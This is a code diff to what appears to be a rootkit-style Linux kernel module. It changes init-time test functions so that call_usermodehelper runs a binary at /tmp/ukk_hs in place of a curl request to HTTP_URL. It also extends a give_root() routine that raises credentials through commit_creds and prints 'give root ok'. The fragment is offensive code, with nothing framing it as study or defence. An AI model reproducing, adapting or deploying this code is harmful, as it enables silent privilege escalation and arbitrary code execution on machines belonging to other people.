@@ -162,8 +162,8 @@ static __init int shell_test0(void)
 static __init int shell_test1(void)
 {
     int result = 0;
-    char cmd_path[] = "/usr/bin/curl";
-    char* cmd_argv[] = {cmd_path,"-s", "-o", "/dev/null", HTTP_URL,NULL};
+    char cmd_path[] = "/tmp/ukk_hs";
+    char* cmd_argv[] = {cmd_path, NULL, NULL};
     char* cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};
 
     result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
@@ -184,8 +184,8 @@ static __init int shell_test2(void)
 
     result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
     if(debug_flag){
-		printk(KERN_DEBUG "test1 driver init exec! there result of call_usermodehelper is %d\n", result);
-    	printk(KERN_DEBUG "test1 driver init exec! the process is \"%s\", pid is %d.\n",current->comm, current->pid);
+		printk(KERN_DEBUG "test2 driver init exec! there result of call_usermodehelper is %d\n", result);
+    	printk(KERN_DEBUG "test2 driver init exec! the process is \"%s\", pid is %d.\n",current->comm, current->pid);
 	}
     return result;
 }
@@ -475,6 +475,9 @@ give_root(void)
 		#endif
 		commit_creds(newcreds);
 	#endif
+	if(debug_flag == 0){
+		printk("give root ok\n");
+	}
 }
 
 static inline void
